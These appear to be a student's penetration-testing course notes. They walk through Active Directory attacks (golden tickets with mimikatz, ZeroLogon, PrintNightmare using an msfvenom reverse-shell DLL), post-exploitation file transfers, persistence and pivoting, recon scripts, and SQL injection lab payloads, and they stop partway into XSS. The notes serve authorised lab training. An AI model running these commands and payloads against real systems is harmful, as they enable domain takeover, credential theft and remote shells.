- <span style="color:#00b050">this is the result:</span>![[Pasted image 20240304114012.png]]

keep in mind that:
the PC passwords (`HYDRA-DC$, SPIDERMAN$...`) -->  are useless to decrypt
=>
focus on the -->  accounts

#### Golden Tickets Attack Overview
read again [[Notes_ETH#Kerberoasting|Kerberoasting]]

when we compromise the:
KeRBeros Ticket Granting Ticket (KRBTGT) account =>   we own the domain
=>
<span style="color:#00b050">we can request</span> -->  any resource or system on the domain

what we want:
a Golden tickets -->  that is a <span style="color:#00b050">complete access to every machine</span> 

we'll use [[Notes_ETH#Mimikatz|Mimikatz]] -->  to retrieve some information  (that we need)
<span style="background:#fff88f">we need:</span>
 - the KRBTGT NTLM hash
 - the domain SID

with these 2 data -->  <span style="color:#00b050">we generate our Golden tickets</span>

<span style="background:#fff88f">after having generated the Golden tickets:</span>
we can use the "pass the ticket attack" -->  to <span style="color:#00b050">utilize the ticket anywhere</span>

with this ticket:
<span style="color:#00b050">we can access every machine</span> <span style="color:#00b050">on the DOMAIN</span>

##### Attack
#AD_tool
turn on THEPUNISHER and Domain Controller
from the Domain Controller -->  install [[cheet#Install mimikatz on victim machine|mimikatz]]
- `mimikatz.exe`
- `privilege::debug`
- `lsadump::lsa /inject /name:krbtgt`    -->  pull down only the kerberos tgt account
  ![[Pasted image 20240304121920.png]]
- open a notepad
- copy the SID and the KRBTGT NTLM hash
- `kerberos::golden /User:Administrator /domain:marvel.local /sid:<copytheSID> /krbtgt:<copytheKRBTGT> /id:500 /ptt`
  `/User:...` -->  can be anything (even a fake account)
  `/id:500` -->  is the admin account
  `/ptt` -->  pass the ticket
  =>
  we are:
  - generating -->  a golden ticket
  - passing it to -->  pass the ticket
                 to use this ticket inside our session (the command line)
                 =>
                 we are going to -->     - open a new terminal
                                     - that has this ticket
                                     - from which we can -->  <span style="color:#00b050">ACCESS ANY PC IN THE </span>
                                                         _<span style="color:#00b050">DOMAIN</span> 
    =>
    ![[Pasted image 20240304122817.png]]

- `misc::cmd`    to open new terminal with the ticket loaded
  =>
  from here -->  <span style="color:#00b050">we can access to any PC in the domain</span>
  example:
  access the THEPUNISHER C drive:
  `dir \\THEPUNISHER\c$`
  ![[Pasted image 20240304123147.png]]

<span style="background:#fff88f">what can we do now:</span>
- we can download here [[cheet#psexec.py|psexec]] 
- <span style="color:#00b050">gain access to THEPUNISHER machine</span> 
  example:
  `psexec.exe \\THEPUNISHER cmd.exe`

### Additional AD Attacks
- <span style="color:#00b050">ZeroLogon</span> -->  if you miss something in this attac
- <span style="color:#00b050">PrintNightmare</span>
- <span style="color:#00b050">Sam the Admin</span>

it's worth checking for these vuln -->  but you shouldn't exploit them unless with client approves

how to check:
there are tools for checking if -->  a domain is affected by these vuln

#### Abusing ZeroLogon
#AD_tool
It's a dangerous attack to run
<span style="background:#fff88f">what is capable of doing:</span>
- attacking a Domain Controller
- setting the domain controller password -->  to <span style="color:#00b050">null</span>
- take over the domain controller

> [!warning] If you don't restore the password
we will -->  break the Domain Controller

- clone this [repo](https://github.com/dirkjanm/CVE-2020-1472)
- you must have:
	- the latest Impacket tool version
	- python >= 3.7
- cd the repo
- save from this [repo](https://github.com/SecuraBV/CVE-2020-1472) -->  the `zerologon_tester.py` 
- put it inside the first repo that you cloned
- this script checks if the domain is vulnerable to Zerologon attack:
  =>
  `python3 zerologon_tester.py HYDRA-DC <domain controller IP>`
  ![[Pasted image 20240304152050.png]]
- in this way you can inform your client that:
	- he is vulnerable to this attack
	- he can fix it (without demonstrate with the real exploit)

if you want to run the attack:
- `python3 cve-2020-1472-exploit.py HYDRA-DC <domain controller IP>`
  ![[Pasted image 20240304152439.png]]
- to check if the script has changed the Domain Controller password:
  `secretsdump.py -just-dc MARVEL/HYDRA-DC\$@<domain controller IP>`
- at this point we own this Domain Controller

<span style="background:#fff88f">How to restore to the previous password:</span>
- copy the entire Administrator hash
- `secretsdump.py administrator@<domain controller IP> -hashes <hash>`
- search in the result -->  `MARVEL\HYDRA-DC$: plain_password_hex`
- copy this value
- `python3 restorepassword.py MARVEL/HYDRA-DC@HYDRA-DC -target-ip <domain controller IP> -hexpass <the previous copied value>`
  ![[Pasted image 20240304152955.png]]
- <span style="color:#00b050">password restored</span>

#### PrintNightmare (CVE-2021-1675)
#AD_tool
This is a -->  post compromised attack

This attack takes advantage of -->  <span style="color:#00b050">printer spooler</span>
bc it allows:
users to add printers that run as -->  <span style="color:#00b050">system privilege</span> 
=>
any authenticated attacker can -->  <span style="color:#00b050">code execution</span>

First thing:
- the steps are described in this [repo](https://github.com/cube0x0/CVE-2021-1675)
- check if the victim domain is vulnerable:
  `rpcdump.py @<domain controller IP> | egrep 'MS-RPRN|MS-PAR'`
  ![[Pasted image 20240304153716.png]]
  if we obtain this =>  <span style="color:#00b050">domain controller is vulnerable</span>

=>
##### Update/install Impacket
to run the attack:
- update impacket
	- `pip3 uninstall impacket`
	- `git clone https://github.com/cube0x0/impacket`
	- `cd impacket`
	- `python3 ./setup.py install`
	  
- from the repo below:
	- copy the code in the `CVE-2021-1675.py`
	- save it locally inside the impacket folder

- we need to create a malicious DLL and host it:
	- create a malicious DLL:
		- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=5555 -f dll > shell.dll`
	- set up the listener:
		- `msfconsole`
		- `use multi/handler`
		- `options`
		- `set payload windows/x64/meterpreter/reverse_tcp`
		- `set LPORT 5555`
		- `set LHOST LHOST=<attacker IP>`
		- run
	- set up a file share:   (we need to share the shell.dll)
		- `smbserver.py share 'pwd'`
=>
we have set up everything
Now:
<span style="background:#fff88f">we need only to run the attack:</span>
- go inside the impacket folder
- `python3 CVE-2021-1675.py marvel.local/fcastle:Password1@<domain controller IP> \\<attacker IP (to go the file share)\share\shell.dll> `
> [!warning] if it fails
> set up the file share with the `-smb2support` option
> =>
> `smbserver.py share 'pwd' -smb2support`
> 
> run again the attack

=>
<span style="color:#00b050">we can dump all the hashes</span>

### AD Case Study 
#### AD Case Study 1
we are going to see 3 case studies where all the attacks that we saw didn't work
so you need something else

scenario:
- internal pentest (in an US hospital)
- they spent a lot of money in Defences:
	- IPv6 disabled => no mitm6 attack
	- IDS/IPS
	- CyberArk =>  tools that makes responder useles
	  
what are we missing?
- nothing about [[Notes_ETH#SMB Relay Attack|smb Relay Attack]]
  =>
  indeed this attack worked
- they could relay on a machine that had -->  <span style="color:#00b050">smb signing disabled</span>
- from here they could dump -->  all the hashes of the users (include the Administrator)
- By cracking the hashes -->  they found one password
- with it they had a shell

what is the lesson here:
- this client spent a lot in security
- but miss some basics locally configuration -->  as <span style="color:#00b050">smb signing disabled</span>

1) **Enable SMB Signing (and disabled LLMNR)** – If I do not have the ability to perform the relay attack, I don’t get my initial shell.  While the possibility of other footholds exist, eliminating any potential foothold can slow down or completely prevent an attacker (motivation dependent, of course).

2) **Least privilege** – I know this is easier said than done, but preventing users from being administrators on their machine (and especially multiple machines) goes a long way in regards to properly securing your network.

3) **Account tiering** – If Bob is a domain admin, then Bob should have at least two domain accounts.  One account for everyday use and one account that one logs into the domain controller with when absolutely necessary.  Having a domain admin be part of an LLMNR or relay attack could signal game over immediately if weak policies are in place.

4) **DON’T REUSE YOUR PASSWORDS** – This should make sense by now, yeah?  Not only should you have strong passwords, but you should also only being using the passwords one time only.  If an attacker gets shell access to a machine and dumps the hash, the hash/password should work nowhere else.  It certainly shouldn’t work on nearly every computer in the network and it certainly shouldn’t disable endpoint protection.



#### AD Case Study 2
scenario:
- internal pentest (in an US hospital)
- they spent a lot of money in Defences:
	- IPv6 disabled => no mitm6 attack
	- no LLMNR
	- SMB Signing enabled
	- IDS/IPS
	- A/V on all devices

we can't perform any of the easy attacks
=>
start thinking outside the box:
<span style="color:#00b050">what is available in the network?</span> 
look for printers/devices/default credentials

what they found:
- they found a tool in development -->  that has a password in clear text:
                                  _<span style="color:#00b050">Local Administrative Password: ...</span>
- we don't know the user associated to it
  =>
  but we can try with the administrator user
- they tried with [[cheet#crackmapexec]] -->  and they found a machine
- now they ran -->  [[cheet#secretsdump]] -->  to find any relevant info
	- by dumping hashes they found that:
		- the Administrator and admin account had the same hash
		  =>
		  they ran again -->  crackmapexec with the new account found
		  
We can also often find cleartext credentials.  
Sometimes, these cleartext credentials show up in the form of <span style="color:#00b050">WDigest</span>, which is enabled by default on Windows 7, Windows 8, Windows Server 2008 R2, and Windows Server 2012.

<span style="background:#fff88f">What’s so special about WDigest?</span> 
It stores the credentials of any user that has logged into that machine since it has been turned on in clear text.  Imagine an environment where devices are still running on older versions of Windows.  This is pretty common in hospitals.  
Now imagine we log onto a machine that is vulnerable and a domain administrator has logged into it as well.

We’ll capture a domain administrator’s password in clear text, as such:
![[Pasted image 20240304163216.png]]
As you can see above, we have managed to dump out two accounts.  Both of which were domain admins.

Once we have our domain administrator password, we can go log into the domain controller

lessons learned:
- No default credentials
- turn off WDigest
- Don’t give service accounts Domain Admin access
- DON’T REUSE YOUR PASSWORDS



#### AD Case Study 3
scenario:
- there we LLMNR on 
- but no local admin into all the machines
- => they found a lot of accounts (but not admin)

but:
- one device had access to -->  file share
  =>
  they found a -->  Macbook Pro Setup Procedure
- inside it they found in clear text -->  an "admin" account and a password
- using crackmapexec -->  they found one machine where they could access inside it
=>
lesson:
think outside the box

# Post Exploitation
we'll cover at high level
we'll see:
- information gathering
- scanning and enumeration
- exploitation

## File transfers
Usually as attacker we -->  host files
### Host a file 
navigate to the directory where you have your files that you want to be hosted:
`python3 -m http.server 80`
or
`python3 -m pyftpdlib 21`

### Retrieve a file
#### Windows
`certutil.exe -urlcache -f http://10.10.10.10/file filename_for_download`
#### Linux
`wget http://10.10.10.10/file`


<span style="background:#fff88f">If `certutil` and `wget` are not working:</span>
`python3 -m pyftpdlib 21`   -->  from the attacker
`ftp 10.10.10.10`                  -->  from the victim

### Metasploit
if you have a meterpreter shell -->  you can use the features `upload/download`
                               to download and upload a file

## Maintaining Access
During a pentest work -->  usually you don't need to persist your access
in a red team assessment:
YES

what usually you can do:
- add a user -->  `net user hacker password123/add`
- use [[cheet#psexec.py|psexec.py]] to get a shell -->  `sudo psexec.py domain/user:'password'@<victim ip>`

### Metasploit
`run persistence -h`
`exploit/windows/local/persistence`
`exploit/windows/local/registry_persistence`


>[!warning] This is dangerous
>bc you are -->  opening a port on the victim
>=>
>everyone can access to it 
>(usually there is no reason to do that)

#### Schedule task
Some precautions as before

`run scheduleme`
`run schtaskabuse`

what is a schedule task:
if you have a malware on a pc => this task will check like every 5 min 
                             =>
                             if the pc gets rebooted:
                             - the task runs again
                             - you'll get a shell again

## Pivoting
<span style="background:#fff88f">pivoting:</span>
 act of an attacker -->    - moving from 1 compromised system to 1 or more other systems 
                     - within the same or other organizations
 
imagine that you have compromised a machine:
- that machine allows you -->  access to 2 network interfaces
- these 2 networks -->  share a new network
                     that was originally unavailable to you

what we can do:
- set up a -->   <span style="color:#00b050">proxy</span> 
- pivot through that 

you can do with 2 tools:
- proxychains
- sshuttle

<span style="background:#fff88f">scenario:</span>
- we have compromised a machine
- we have ssh access to it as root
- doing an `ip a` -->  we find 2 IPs:
                    - `10.10.155.5` -->  machine IP
                    - `10.10.10.5` -->  the network that we don't have access

if we try with a new tab to ping the network:
=>
we don't receive response -->  bc we don't have access to it
=>
<span style="background:#fff88f">what we need:</span>
<span style="color:#00b050">establish a pivot</span>:
- <span style="color:#00b050">from</span> the victim machine (`10.10.155.5`)
- <span style="color:#00b050">to</span> the network (`10.10.10.5`)
=>
so that we can -->  <span style="color:#00b050">access to the network</span>

### Proxychains
#AD_tool
first we need to look at -->  proxychains config file
`cat /etc/proxychains.conf` 
![[Pasted image 20240305140259.png]]
we'll use the port 9050 -->  to bind to
=>
`ssh -f -N -D 9050 -i pivot root@10.10.155.5`
`-i` -->  identity (is a file for login)
`-f` -->  run ssh in background
`-N` -->  we don't want to execute command (it's ideal for port forwarding)
`-D` -->  we want to bind the port on port 9050
=>
what happen when we type enter:
![[Pasted image 20240305140741.png]]
we establish a connection with the victim machine in background
=>
now we can -->  <span style="color:#00b050">proxy our traffic through this machine to access the next network</span> 
=>
what can we do:
different things:
- run nmap through proxychains:
  `proxychains nmap -p88 10.10.155.5`       (port 88 bc in this example there is Domain                                                                                         Controller on this port)
- run attacks:
  run [[Notes_ETH#Kerberoasting|kerberoasting attack]]:
  `proxychains GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 10.10.155.5 -request`
  (after we can decrypt the hash)
  
- access the machine:
  `proxychains xfreerdb /u:administrator /p:'Hacker321!' /v:10.10.155.5

- open the browser:
  `proxychains firefox`

### sshuttle
#AD_tool
`sshuttle -r root@10.10.155.5 10.10.10.0/24 --ssh cmd "ssh -i pivot"`
- run this `root@10.10.155.5`
- through that user -->  establish a connection to this `network 10.10.10.0/24`
- run the ssh command `"ssh -i pivot"`

as long as this terminal is open and the connection is established:
=>
we can send command to the network as below:
`nmap -p88 10.10.155.5`  => without having to use proxychains

### chisel
another tool is -->  [chisel](https://github.com/jpillora/chisel)

## Clean Up
from a pentest perspective:   (that is different from a hacker perspective)
the goal is -->  <span style="color:#00b050">leave the system/network as it was when you entered</span> 
=>
- remove executables, scripts, added files
- remove malware, rootkits, added users
- set settings back to original configurations

from a hacker perspective:
the goal is -->  <span style="color:#00b050">make it look like you were never there</span>
=>
- eliminating yourself from log files
- all the things above

# Web Application Enumeration (revisited)
we already seen:
- [[cheet#Nikto]]
- [[cheet#Dirbuster]]
- [[cheet#dirb]]
- [[cheet#BurpSuite]]

## Installing Go
Follow these [[Install#Go|commands]]

## Assetfinder
new and fastest tool for finding subdomain and domains related to the target domain
[[cheet#Assetfinder]]

let's create a bash script for our web enumeration:
we'll start by:
- using assetfinder
- create directory for the results
- filter to save only the subdomains and not the domains related to it

```bash
#!/bin/bash

url=$1 

if [ ! -d "$url" ];then 
	mkdir $url
fi

if [ ! -d "$url/recon" ];then 
	mkdir $url/recon
fi

echo "[*] Harvesting subdomains with assetfinder"
assetfinder $url >> $url/recon/assets.txt #
cat $url/recon/assets.txt | grep $1 >> $url/recon/final.txt 
rm $url/recon/assets.txt

```

## Amass
another tool for finding subdomain
[[cheet#Amas]]

## httprobe
tools that checks if the domains are responding with some status or not
[[cheet#httprobe]]
`cat folders/list_domains.txt | httprobe`

<span style="background:#fff88f">if you want to list all the domains that replied without the https:// and :443 in the output:</span>
`cat list_domains.txt | httprobe -s -p https:443 | sed 's/https\?:\/\///' | tr -d ':443' >> alive.txt` 
![[Pasted image 20240305184735.png]]
=>
update our script:
```bash
#!/bin/bash
if [[ $EUID -ne 0 ]]; then
	echo "[!] This script must be run as root"
	exit 1
else
	if [ $# -lt 1 ];then
		echo "[!] Usage: ./run.sh <URL>"
		exit 1
	else
		url=$1 
		
		if [ ! -d "$url" ];then 
			mkdir $url
		fi
		
		if [ ! -d "$url/recon" ];then 
			mkdir $url/recon
		fi
		
		echo "[*] Harvesting subdomains with assetfinder"
		assetfinder $url >> $url/recon/assets.txt #
		cat $url/recon/assets.txt | grep $1 >> $url/recon/final.txt 
		rm $url/recon/assets.txt
		
		echo "[*] Probing for alive subdomains"
		cat $url/recon/final.txt | sort -u | httprobe -s -p https:443 | sed's/https\?:\/\///' | tr -d ':443' >> $url/recon/alive.txt
	fi
fi

```

>[!warning] After you run httprobe
> always check for juicy subdomain:
> `cat alive.txt | grep dev`
> `cat alive.txt | grep test`
> `cat alive.txt | grep admin`

## GoWitness
[[cheet#GoWitness]]
this tool takes screenshot of a website
scenario -->  you have done subdomain hunting + check subdomains alive with httprobe
=>
GoWitness -->  automates the process of opening each subdomains (without having to do it                                                                                                                                manually)
to do a single screenshot:
`gowitness single https://tesla.com`    in your current directory you'll find a screenshot folder

##  Automating the Enumeration Process 
```bash
#!/bin/bash	

if [[ $EUID -ne 0 ]]; then
	echo "[!] This script must be run as root"
	exit 1
else
	if [ $# -lt 1 ];then
		echo "[!] Usage: ./run.sh <URL>"
		exit 1
	else
		url=$1 
		if [ ! -d "$url" ];then
			mkdir $url
		fi
		if [ ! -d "$url/recon" ];then
			mkdir $url/recon
		fi
		if [ ! -d "$url/recon/scans" ];then
			mkdir $url/recon/scans
		fi
		if [ ! -d "$url/recon/httprobe" ];then
			mkdir $url/recon/httprobe
		fi
		if [ ! -d "$url/recon/potential_takeovers" ];then
			mkdir $url/recon/potential_takeovers
		fi
		if [ ! -d "$url/recon/wayback" ];then
			mkdir $url/recon/wayback
		fi
		if [ ! -d "$url/recon/wayback/params" ];then
			mkdir $url/recon/wayback/params
		fi
		if [ ! -d "$url/recon/wayback/extensions" ];then
			mkdir $url/recon/wayback/extensions
		fi
		if [ ! -f "$url/recon/httprobe/alive.txt" ];then
			touch $url/recon/httprobe/alive.txt
		fi
		if [ ! -f "$url/recon/final.txt" ];then
			touch $url/recon/final.txt
		fi
		
		echo "[*] Harvesting subdomains with assetfinder"
		assetfinder $url >> $url/recon/assets.txt
		cat $url/recon/assets.txt | grep $1 >> $url/recon/final.txt
		rm $url/recon/assets.txt
		
		echo "[*] Probing for alive domains"
		cat $url/recon/final.txt | sort -u | httprobe -s -p https:443 | sed 's/https\?:\/\///' | tr -d ':443' >> $url/recon/httprobe/a.txt
		sort -u $url/recon/httprobe/a.txt > $url/recon/httprobe/alive.txt
		rm $url/recon/httprobe/a.txt
		
		echo "[*] Checking for possible subdomain takeover"
		
		if [ ! -f "$url/recon/potential_takeovers/potential_takeovers.txt" ];then
			touch $url/recon/potential_takeovers/potential_takeovers.txt
		fi
		
		subjack -w $url/recon/final.txt -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 -o $url/recon/potential_takeovers/potential_takeovers.txt
		
		echo "[*] Scanning for open ports"
		nmap -iL $url/recon/httprobe/alive.txt -T4 -oA $url/recon/scans/scanned.txt
		
		echo "[*] Scraping wayback data"
		cat $url/recon/final.txt | waybackurls >> $url/recon/wayback/wayback_output.txt
		sort -u $url/recon/wayback/wayback_output.txt
		
		echo "[*] Pulling and compiling all possible params found in wayback data"
		cat $url/recon/wayback/wayback_output.txt | grep '?*=' | cut -d '=' -f 1 | sort -u >> $url/recon/wayback/params/wayback_params.txt
		for line in $(cat $url/recon/wayback/params/wayback_params.txt);do echo $line'=';done
		
		echo "[*] Pulling and compiling js/php/aspx/jsp/json files from wayback output"
		for line in $(cat $url/recon/wayback/wayback_output.txt);do
			ext="${line##*.}"
			if [[ "$ext" == "js" ]]; then
				echo $line >> $url/recon/wayback/extensions/js1.txt
				sort -u $url/recon/wayback/extensions/js1.txt >> $url/recon/wayback/extensions/js.txt
			fi
			if [[ "$ext" == "html" ]];then
				echo $line >> $url/recon/wayback/extensions/jsp1.txt
				sort -u $url/recon/wayback/extensions/jsp1.txt >> $url/recon/wayback/extensions/jsp.txt
			fi
			if [[ "$ext" == "json" ]];then
				echo $line >> $url/recon/wayback/extensions/json1.txt
				sort -u $url/recon/wayback/extensions/json1.txt >> $url/recon/wayback/extensions/json.txt
			fi
			if [[ "$ext" == "php" ]];then
				echo $line >> $url/recon/wayback/extensions/php1.txt
				sort -u $url/recon/wayback/extensions/php1.txt >> $url/recon/wayback/extensions/php.txt
			fi
			if [[ "$ext" == "aspx" ]];then
				echo $line >> $url/recon/wayback/extensions/aspx1.txt
				sort -u $url/recon/wayback/extensions/aspx1.txt >> $url/recon/wayback/extensions/aspx.txt
			fi
		done
		
		rm $url/recon/wayback/extensions/js1.txt
		rm $url/recon/wayback/extensions/jsp1.txt
		rm $url/recon/wayback/extensions/json1.txt
		rm $url/recon/wayback/extensions/php1.txt
		rm $url/recon/wayback/extensions/aspx1.txt
	fi
fi

```





# Find & Exploit Common Web Vulnerabilities
## Lab Setup
### Docker
- Install docker:
	`sudo apt install docker.io`                  -->  `check with docker --version`
	`sudo apt install docker-compose`         -->  `check with docker-compose --version`

- Download the laboratory tar from tcm and extract it:
  `tar -xf peh-web-labs.tar.gz`
  `cd peh-web-labs/labs/`

- Run docker compose:
  `sudo docker-compose up`
  >[!warning] Error
  >if you got an error `Error starting userland proxy: listen tcp4 0.0.0.0:80: bind`
  =>
  try to stop apache and then run again docker -compose:
  `sudo /etc/init.d/apache2 stop`

- go ahead when you see -->  the databses are 'ready for connections'
  ![[Pasted image 20240307104124.png]]

- => open new tab and set the permission to the web-server:
  `./set-permissions.sh`

- open the browser to localhost to see if it's working:
  ![[Pasted image 20240307104930.png]]
- click on -->  "Click here to reset the database"
#### Docker commands
`CTRL + C -->  inside the terminal`    -->   to <span style="color:#00b050">stop</span> the container
`sudo docker-compose up -d`                   -->  to run the container in <span style="color:#00b050">background</span>
                                      to <span style="color:#00b050">stop</span> the container created in background:
                                      `sudo docker-compose stop`
                                      
`sudo docker ps -a`                                  -->  <span style="color:#00b050">check</span> which containers are <span style="color:#00b050">running</span>
`sudo docker rm <container-ID>`            -->  <span style="color:#00b050">remove</span> the container
                                       <span style="background:#fff88f">to remove all containers:</span>
`sudo docker rm $(sudo docker ps -aq)`

### BurpSuite
once everything is working:
- open BurpSuite
- turn on [[cheet#FoxyProxy|FoxyProxy]] (already configured)

## Attacks
### SQL Injection
Our lab uses this -->  users table:
![[Pasted image 20240307111356.png]]

#### Injection 0x01
- Turn on docker-compose
- Open browser to localhost
- Open the first lab

we'll find a simply search bar:
if we write for example -->  jeremy => it will return the email
![[Pasted image 20240307111601.png]]
[[cheet#SQL Injection]]
[SQL Injection Cheet Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
##### Basic trigger and operators
- try to use characters that might trigger an error:
  `jeremy'`
  `jeremy"`
  `'`
  `"`
- `jeremy' or 1=1#`
  `or 1=1` -->  returns always true
  `#` -->  end sql queries                      (for mysql you can also use `-- -`)
        => everything after this -->  will be ignored
    ![[Pasted image 20240307112811.png]]
    this in an indication that the app -->  is vulnerable to SQL injection

##### Union
we can use it to selects other information or info from another table
>[!warning] Constraint
>There is a constraint to use UNION:
> we can only select -->  the same n° of columns as in the original query

=>
`jeremy' union select null#`
`jeremy' union select null,null#`
`jeremy' union select null,null,null#`
![[Pasted image 20240307113504.png]]
we find something
=>
`jeremy' union select null,null,version()#` -->  to read the db version
![[Pasted image 20240307113541.png]]
<span style="background:#fff88f">to find all the tables that exist in the db:</span>
`jeremy' union select null,null,table_name from information_schema.tables#`

<span style="background:#fff88f">get all the columns name that exist in the db:</span>
`jeremy' union select null,null,column_name from information_schema.columns#`

=>
our tables for this challenge is -->  <span style="color:#00b050">injection0x01</span>    (we can find it using the command above)
=>
we want to get <span style="color:#00b050">jeremy password</span>:
`jeremy' union select null,null,password from injection0x01#`
![[Pasted image 20240307114407.png]]
in this case we have found -->  <span style="color:#00b050">all the passwords in the table</span> 

>[!warning] Constraint
>sometimes if you use something like this:
>`jeremy' union select null,null,...`
>
>and the values in the null columns are not a string => you will get an error
>=>
>try to use different things:
>for example:
>- null(int)
>- 1





#### Injection 0x02
![[Pasted image 20240307115338.png]]
default credentials -->  `jeremy:jeremy`

##### BurpSuite
- open it
- click on Target > Scope Settings > Add > `http://localhost` > Ok > Yes
  ![[Pasted image 20240307120204.png]]
###### Enable history only from the target site
  go to Proxy > HTTP history > right click on one of them > Clear History
  =>
  in this way if you search for something in google =>  it won't appear in the history


- insert the default credentials in the webpage
- <span style="background:#fff88f">first thing to do always:</span>
  open burpsuite and go to the History > double click on the POST request to see it
- you can also see the Response =>  always look at the `Content-length` in the response
                                 (in this case is 1928)

###### Use Repeater
repeater allows you to -->  inject data and modify them
=>
- right click on the POST request that you opened
- send to Repeater
- open the Repeater section
- try to modify the password to something else > click on Send > look at the response
- now the `Content-Length` is different (2122)
  >[!info] Look visually
  >if you want to look the response visually:
  >=>
  >after the Response click on -->  Render
  >![[Pasted image 20240307123321.png]]
  
- let's try to inject `jeremy' or 1=1#`
  =>
	- add to the username `' or 1=1#`
	- select this text > CTRL+U  -->  to include it as input > then click on Send
	- =>
	  we still receive a response with 2122 => invalid credentials
- try also with `jeremy" or 1=1#` -->  same result :(

=>
let's try to automate this process to find if there is potential SQL injection vuln:
###### Sqlmap
- copy the entire POST request with the initial values   (=> remove the 'or 1=1#)
- save it inside a text file
- `sqlmap -r req.txt`
=>
in this case -->  the tool said that the parameters does not seem to be injectable 
![[Pasted image 20240307130311.png]]

What can we do now:
- go back to manual testing
- download a list of payloads and try to fuzz it
- look for other injection points




in this case -->  let's see what the application can offer more
=>
go back to the Proxy > HTTP History

as you can see:
- when we send a legitimate request with good credentials:
	- web server replies by setting a cookie
	- the next GET request includes -->  this cookie
=>
- open this GET request
- send it to repeater (CTRL+R)
- click on Send -->  to see the initial request
                 The response has `Content-Length` = 1027
- try to modify the cookie and look at the Response `Content-Length` (if it changes)
- if the Content-Length is not reliable =>  use the Search bar after the response to search to 
                                     something that can change based on the req
- try to add to the cookie -->  `' and 1=1#`
  ![[Pasted image 20240307131833.png]]
- the length doesn't change =>  this can be a sign that there is a potential SQL injection

NOW:
we need to create an injection that can be replied with -->  Yes/No
to do that we can use:
sql `substring` function -->  substring('word', 1, 2)
                         it takes 3 parameters:
                         - a word 
                         - the index inside the word
                         - how many letters you want to extract
                         =>
                         in this case `substring('word', 1, 2)` = wo
=>
we can use this to craft a useful injection:
let's make a stupid example -->  we want to find the database version
=>
the sql versions are usually something like this -->  7.0.1
=>
- let's try to add to the cookie -->  `' and substring((select version()), 1, 1) = '7'#`
- click on Send
	-<span style="color:#00b050"> if the server replies with</span> `Content-Length` = 1027 =>  7 is the correct version
	- but here server replied with different length => is wrong
- let's try with version 8 -->  `' and substring((select version()), 1, 1) = '8'#`
	- it's correct
- now the next Ch will probably be "." -> `' and substring((select version()), 1, 2) = '8.'#`
	- it's correct
- now let's try if the version is 8.0 --> `' and substring((select version()), 1, 3) = '8.0'#`
	- it's correct
=>
<span style="color:#00b050">we can repeat this process until we find the version:</span>
`' and substring((select version()), 1, 5) = '8.0.3'#`
![[Pasted image 20240307152847.png]]

Now:
we can use this mechanism -->  to find the <span style="color:#00b050">jessamy password</span>

<span style="background:#fff88f">Find jessamy password:</span>
we don't want to do it manually, bc it means doing something like this:
#payload
`' and substring((select password from injection0x02 where username = 'jessamy'), 1, 1) = 'a'#`
this will check -->  if the first Ch of jessamy password is equal to 'a'
=>
in this way it takes a life to find the password
=>
we can automate using <span style="color:#00b050">INTRUDER</span>:
- on the current request with our #payload click CTRL+i -->  to send it to Intruder 
- click on Intruder Section
- select the 'a' in the payload and add as value
  ![[Pasted image 20240307153917.png]]

- click on the Payloads section
- in the Payload settings [Simple list] insert our list => Ch from a to z and number 0 to 9 
  =>
  ![[Pasted image 20240307154214.png]]
- now click on -->  Start attack
- click on Length -->  to order by length
  =>
  `z` -->  is the only Ch with different length =>  <span style="color:#00b050">we found the first password Ch</span> 
	- if you click on the z:
		- open the response
		- search below in the bar "welcome" -->  we can check if the injection worked
		  ![[Pasted image 20240307154633.png]]

now:
we can continue in this way with BurpSuite
or:
use [[cheet#sqlmap]]

<span style="background:#fff88f">sqlmap:</span>
- copy the clean request without the payload
- save it inside a txt file
- `sqlmap -r req2.txt --level=2`
  ![[Pasted image 20240307155135.png]]
	- when it asks for:
		- fuzzy test --> n
		- random integer value --> n
		- y
		- n
	=>
	<span style="color:#00b050">We have a payload</span> 
	![[Pasted image 20240307155619.png]]
	=>
- we can try to use the payload to find the password:
- `sqlmap -r req2.txt --level=2 --dump -T injection0x02`  -->  -T to try only for this table
	- URL encode cookie values --> n
	- store hashes --> n
	- crack them via dictionary attack -->  n

=>
<span style="color:#00b050">we found the password:</span>
![[Pasted image 20240307160349.png]]

#### Injection 0x03
 goal -->  find admin password
##### Manually
 if we type random string --> doesn't return anything
 =>
<span style="background:#fff88f"> test if webserver is vulnerable:</span>
 `randomString' or 1=1#`
 if it returns something => it's vulnerable (this is the case)
 
if we search a product => we find his description
=>
let's try to use [[Notes_ETH#Union|union]] -->  to find tables and maybe passwords
=>
<span style="background:#fff88f">first find the number of column that we need:</span>
`Senpai Knife Set' union select null,null,null,null#`
<span style="color:#00b050">with 4 null we found something</span>
![[Pasted image 20240307164349.png]]

=>
<span style="background:#fff88f">let's find the tables:</span>
`Senpai Knife Set' union select null,null,null,table_name from information_schema.tables#`
![[Pasted image 20240307163129.png]]

<span style="background:#fff88f">let's find usernames:</span>
`Senpai Knife Set' union select null,null,null,username from injection0x03_users#`
<span style="color:#00b050">we found an username</span> -->  takeshi
>[!example]
>if we don't know the column name
>=>
>we can:
>- guess it
>- enumerate it



<span style="background:#fff88f">let's find passwords:</span>
`Senpai Knife Set' union select null,null,null,password from injection0x03_users#`
<span style="color:#00b050">we found a password</span> -->  onigirigadaisuki

<span style="color:#00b050">finish :)</span>

##### sqlmap and BurpSuite
- enable foxyproxy
- click on Target > Scope Settings > Add > `http://localhost` > Ok > Yes
- click on one of the POST request
- copy it
- save it in a txt file and substitute the last with -->  `product=test`
- `sqlmap -r req.txt -T injection0x03_users --dump`
  ![[Pasted image 20240307171043.png]]



### XSS
Cross Site Scripting (XSS) -->  let us execute JavaScript in a victim browser
3 types:
- <span style="color:#00b050">reflected</span>:
  the <span style="color:#6666ff">script</span> that you're trying to inject -->  <span style="color:#6666ff">comes from the current HTTP req</span>
  =>
  - you send a request
  - you receive a response
  =>  the malicious script is included -->  in the response
  
  you can only target yourself unless:
  - the <span style="color:#6666ff">payload</span> is inside -->  the <span style="color:#6666ff">URI</span>
  - you <span style="color:#6666ff">entice</span> a user -->  to click on the link                        (enitce = attract)

- <span style="color:#00b050">stored</span>:
  more powerful
	-  <span style="color:#6666ff">payload</span> is stored in something like a -->   <span style="color:#6666ff">DB</span>
	- payload can be <span style="color:#6666ff">retrieved</span> <span style="color:#6666ff">later</span>
    =>
